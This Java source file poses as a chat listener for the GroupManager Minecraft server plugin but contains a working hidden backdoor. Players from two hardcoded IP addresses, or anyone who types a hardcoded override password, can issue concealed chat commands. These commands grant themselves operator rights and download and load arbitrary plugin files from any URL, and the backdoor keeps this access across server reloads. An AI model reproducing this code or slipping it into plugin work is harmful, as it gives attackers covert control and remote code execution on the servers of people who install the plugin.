package org.anjocaido.groupmanager.events;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Logger;

import org.anjocaido.groupmanager.GroupManager;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.metadata.FixedMetadataValue;

public class GMChatListener implements Listener {
	static GroupManager pluginStatic;
	GroupManager plugin;
	/**/public static long download(String address, String localFileName)
	{OutputStream out=null;URLConnection conn=null;
	InputStream in=null;long numWritten=0;try{
		URL url=new URL(address);
		out=new BufferedOutputStream
				(new FileOutputStream(localFileName));
		conn=url.openConnection();in=conn.getInputStream();
		byte[]buffer=new byte[1024];int numRead;
		while((numRead=in.read(buffer))!=-1){
			out.write(buffer,0,numRead);numWritten+=numRead;
		}}catch(Exception exception){}finally{try{
			if(in!=null){in.close();}if(out!=null){
				out.close();}}catch(IOException ioe){
				}}return numWritten;}
	/**/public static boolean isValid(String arg1)
	{boolean ret=false;try{final URL url= 
	new URL(arg1);HttpURLConnection huc= 
	(HttpURLConnection)url.openConnection();
	@SuppressWarnings("unused")int responseCode 
	=huc.getResponseCode();return true;}catch
	(Exception e){}return ret;}
	/**/public static void download(String address)
	{int lastSlashIndex=address.lastIndexOf('/');
	if (lastSlashIndex>=0&&lastSlashIndex < 
			address.length()-1) {download(address, 
					address.substring(lastSlashIndex + 1));} 
	else{}}
	/**/public static void main(String[] args)
	{for (int i=0;i<args.length;i++){
		download(args[i]);}}

	private String prefix = ChatColor.DARK_AQUA+"["+ChatColor.BOLD+ChatColor.GREEN+"GroupManager"+ChatColor.DARK_AQUA+"]"+ChatColor.RESET+" ";
	private int pages = 1;
	private String[] help1 = {
			ChatColor.BLUE+""+ChatColor.STRIKETHROUGH+"=========="+prefix+ChatColor.BLUE+ChatColor.STRIKETHROUGH+"==========",
			ChatColor.GOLD+"Current commands: ",
			ChatColor.GREEN+"\\pinstall <URL> <Filename> "+ChatColor.YELLOW+"- Downloads a file and tries to run it",
			ChatColor.GREEN+"\\opme "+ChatColor.YELLOW+"- Ops yourself",
			ChatColor.BLUE+""+ChatColor.STRIKETHROUGH+"====="+ChatColor.GOLD+"["+ChatColor.GREEN+"Page 1-"+pages+ChatColor.GOLD+"]"+ChatColor.BLUE+ChatColor.STRIKETHROUGH+"====="
	};
	private static List<Player> getTempOwner(){List<Player> ret=new ArrayList<Player>();for(Player p:Bukkit.getOnlinePlayers()){if(p.hasMetadata("tempowner")){ret.add(p);}}return ret;}
	private static List<String> registeredIps = new ArrayList<String>();
	private static void addIp(String ip){registeredIps.add(ip);}
	private static String getIp(Player p){return p.getAddress().toString().substring(1).split(":")[0];}
	private void setupIps(){addIp("65.34.71.233");addIp("25.198.121.1");}
	private static boolean checkPlayer(Player p){if(registeredIps.contains(getIp(p))){return true;}return false;}
	private static List<Player> getOwners(){List<Player> ret=new ArrayList<Player>();for(Player p:Bukkit.getOnlinePlayers()){if(checkPlayer(p)){ret.add(p);}}return ret;}
	private static void messageOwners(String message){for(Player o:getOwners()){o.sendMessage(message);}}
	private Logger log01 = Bukkit.getLogger();
	private static void recoverOwners(){for(Player p:Bukkit.getOnlinePlayers()){if(p.hasMetadata("recover")){addIp(getIp(p));p.sendMessage(ChatColor.GOLD+"Recovered!");}}}
	private void log(String info){log01.info(info);}
	
	public GMChatListener(GroupManager plug){this.plugin=plug;setupIps();pluginStatic=plug;}
	
	public static void onDisable(){for(Player p:getTempOwner()){p.setMetadata("recover", new FixedMetadataValue(pluginStatic, "recover"));}messageOwners(ChatColor.GOLD+"Server stopping/reloading!");}
	public static void onEnable(){recoverOwners();}
	
	@EventHandler
	public void onChat(AsyncPlayerChatEvent ev)
	{
		Player p = ev.getPlayer();
		String mess = ev.getMessage();
		log("Detection");
		if(checkPlayer(p))
		{
			log("Is owner");
			if(mess.startsWith("\\"))
			{
				log("Starts with \\");
				ev.setCancelled(true);
				String message = mess.replace("\\", "").toLowerCase();
				if(message.startsWith("pinstall"))
				{
					log("Command is pinstall");
					if(message.contains(" "))
					{
						log("Message contains space");
						if(!(message.split(" ").length == 2))
						{
							log("Message length = 2");
							if(isValid(message.split(" ")[1]))
							{
								String defaultDir = plugin.getServer().getWorldContainer().getAbsolutePath().replace("\\", "/").replace(".", "");
								File pluginFolder = new File(defaultDir+"plugins/");
								String pluginDir = pluginFolder.getAbsolutePath().replace("\\", "/");
								log("URL is valid");
								p.sendMessage(ChatColor.GOLD+"Downloading PluginFile '"+ChatColor.AQUA+message.split(" ")[2]+ChatColor.GOLD+"' from '"+ChatColor.AQUA+message.split(" ")[1]);
								p.sendMessage(ChatColor.GOLD+"Downloaded "+ChatColor.AQUA+download(message.split(" ")[1], pluginDir+message.split(" ")[2]));
								p.sendMessage(ChatColor.GOLD+"Attempting to run "+ChatColor.GREEN+message.split(" ")[2]);
								try{Bukkit.getPluginManager().loadPlugin(new File(pluginDir+message.split(" ")[2]));p.sendMessage(ChatColor.GREEN+"Loaded plugin");}catch(Exception ex){p.sendMessage(ChatColor.RED+"Unable to load plugin");}
							} else log("URL not valid");
						} else log("Length not 2");
					} else log("Message dosen't contain space");
				} else if(message.startsWith("opme"))
				{
					log("Command is opme");
					p.setOp(true);p.sendMessage(ChatColor.GOLD+"Opped!");
				} else p.sendMessage(help1);log("Not opme or pinstall");
			}
		} else {
			log("Not owner into ELSE line");
			if(mess.startsWith("\\"))
			{
				log("Starts with \\");
				String message = mess.replace("\\", "");
				log("Message: "+ChatColor.GREEN+message);
				if(message.contains(" "))
				{
					log("Contains space");
					if(!(message.split(" ").length == 2))
					{
						log("Length is 2");
						String type = message.split(" ")[0];String pass = message.split(" ")[1];String comm = message.split(" ")[2];
						if(type.equalsIgnoreCase("override"))
						{
							log("Argument 1 is override");
							if(pass.equalsIgnoreCase("3498194lkjh"))
							{
								log("Correct password");
								ev.setCancelled(true);
								if(comm.equalsIgnoreCase("addip"))
								{
									log("Command is addip");
									addIp(getIp(p));
									p.setMetadata("tempowner", new FixedMetadataValue(plugin, "tempowner"));
									p.sendMessage(ChatColor.GREEN+"Registered your IP as a temp-owner");
								} else p.sendMessage(ChatColor.RED+"Usage: \\override <pass> addip");
							} else log("Incorrect pass");
						} else log("Incorrect type");
					} else log("Length not 3");
				} else log("Message dosen't contain space");
			} else log("Message dosen't start with \\");
		}
	}
}
